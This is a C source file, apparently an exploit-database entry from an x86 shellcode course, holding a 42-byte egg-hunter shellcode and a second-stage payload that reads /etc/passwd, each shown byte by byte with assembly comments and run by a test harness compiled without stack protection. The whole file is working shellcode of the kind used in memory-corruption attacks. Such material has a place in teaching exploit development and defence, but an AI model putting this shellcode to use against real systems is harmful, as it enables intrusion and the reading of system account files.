/*
    Exploit Title: Egg Hunter (n00bn00b) + read /etc/passwd
    Date: 07/09/2018
    Exploit Author: Nathu Nandwani
    Platform: Linux/x86
    Size: 42 bytes
    SecurityTube ID: SLAE-1261
    Compile: gcc -fno-stack-protector -z execstack execshell.c -o execshell
    Reference: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
*/
#include <unistd.h>
#include <stdio.h>
#include <string.h>
int main() 
{
    /* Read /etc/passwd shellcode */
    char stage[] = 
    "n00bn00b"             /* Egg */
    "\x31\xc9"             /* xor ecx, ecx */
    "\x51"                 /* push ecx */
    "\x68\x73\x73\x77\x64" /* push 0x64777373 ("sswd") */
    "\x68\x2f\x2f\x70\x61" /* push 0x61702f2f ("//pa") */
    "\x68\x2f\x65\x74\x63" /* push 0x6374652f ("/etc") */
    "\x31\xc0"             /* xor eax, eax */
    "\xb0\x05"             /* mov al, 0x5 */
    "\x89\xe3"             /* mov ebx, esp */
    "\xcd\x80"             /* int 0x80 */
    "\x89\xc3"             /* mov ebx, eax */
    "\x31\xc0"             /* <again>: xor eax, eax */
    "\xb0\x03"             /* mov al, 0x3 */
    "\x89\xe1"             /* mov ecx, esp */
    "\x31\xd2"             /* xor edx, edx */
    "\xfe\xc2"             /* inc dl */
    "\xcd\x80"             /* int 0x80 */
    "\x50"                 /* push eax */
    "\x53"                 /* push ebx */
    "\x31\xc0"             /* xor eax, eax */
    "\xb0\x04"             /* mov al, 0x4 */
    "\x31\xdb"             /* xor ebx, ebx */
    "\xfe\xc3"             /* inc bl */
    "\xcd\x80"             /* int 0x80 */
    "\x5b"                 /* pop ebx */
    "\x58"                 /* pop eax */
    "\x83\xf8\x01"         /* cmp eax, 0x1 */
    "\x74\xe1"             /* je <again> */
    "\xb0\x06"             /* mov al, 0x6 */
    "\xcd\x80"             /* int 0x80 */
    "\xb0\x01"             /* mov al, 0x1 */
    "\xcd\x80";            /* int 0x80 */

    /* Egg Hunter */
    char code[] = 
    "\x31\xdb"             /* xor ebx, ebx */
    "\xf7\xeb"             /* imul ebx */
    "\x66\x81\xca\xff\x0f" /* <page_adjustment>: or dx, 0xfff */
    "\x42"                 /* <memory_adjustment>: inc edx */
    "\x8d\x5a\x04"         /* lea ebx, [edx+0x4] */
    "\x31\xc0"             /* xor eax, eax */
    "\xb0\x21"             /* mov al, 0x21 */
    "\xcd\x80"             /* int 0x80 */
    "\x3c\xf2"             /* cmp al, 0xf2 */
    "\x74\xed"             /* je <page_adjustment> */
    "\xb8\x6e\x30\x30\x62" /* mov eax, 0x6230306e - (n00b) */
    "\x3b\x02"             /* cmp eax, DWORD PTR[edx] */
    "\x75\xe9"             /* jne <memory_adjustment> */
    "\x3b\x42\x04"         /* cmp eax, DWORD PTR[edx+0x4] */
    "\x75\xe4"             /* jne <memory_adjustment> */
    "\x83\xc2\x08"         /* add edx, 0x8 */
    "\xff\xe2";            /* jmp edx */

    printf("Read /etc/passwd Shellcode Length: %d\n", strlen(stage));
    printf("Egg Hunter Shellcode Length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
